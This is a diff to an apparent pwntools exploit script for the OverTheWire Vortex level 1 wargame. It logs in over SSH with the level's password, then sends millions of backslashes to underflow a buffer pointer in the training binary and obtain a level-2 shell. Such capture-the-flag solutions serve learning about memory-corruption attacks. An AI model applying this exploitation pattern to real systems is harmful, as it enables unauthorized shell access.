@@ -2,6 +2,7 @@
 from pwn import *
 import os
 import time
+import sys
 
 #Level information for ssh
 level = 1
@@ -11,7 +12,7 @@ PASS = 'Gq#qu3bF3'
 PORT = 2228
 
 def connect_to_level():
-    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT, timeout=600)
+    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT, timeout=60)
     return sh
 
 def execute_payload(sh):
@@ -19,24 +20,28 @@ def execute_payload(sh):
     w = log.progress("Executing vortex1")
     shell = sh.run('/vortex/vortex1')
     b = log.progress("Sending backslashes")
-    #shell.sendline("\\"*889192448)
-    for i in range(0, 50):
-        b.status("Stage " + str(i))
-        send_backslashes(shell, i, b)
-    w.success("vortex2 shell established")
+    send_backslashes(shell, b)
+    w.success("Complete")
+    log.success("vortex2 shell established")
     shell.interactive()
 
-def send_backslashes(sh, stage, b):
-    sh.sendline("\\"*11783849)
-    b.status("Stage " + str(stage) + "("+ str(i-1) + " complete)")
+def send_backslashes(sh, b):
+    for stage in range(1, 77):
+        sh.send("\\"*11783849)
+        b.status("Stage " + str(stage))
+    sh.send("x")
+    b.success("All stages sent")
 
 def local_payload():
-    binary=ELF("vortex1alt")
+    binary=ELF("vortex1")
+    w = log.progress("Executing vortex 1")
     p = binary.process()
-    p.sendline("\\"*889192448)
+    b = log.progress("Sending backslashes")
+    send_backslashes(p, b)
     p.interactive() 
 
-#local_payload()
-
-sh = connect_to_level()
-execute_payload(sh)
+if len(sys.argv) == 2 and sys.argv[1] == "local":
+    local_payload()
+else:
+    sh = connect_to_level()
+    execute_payload(sh)
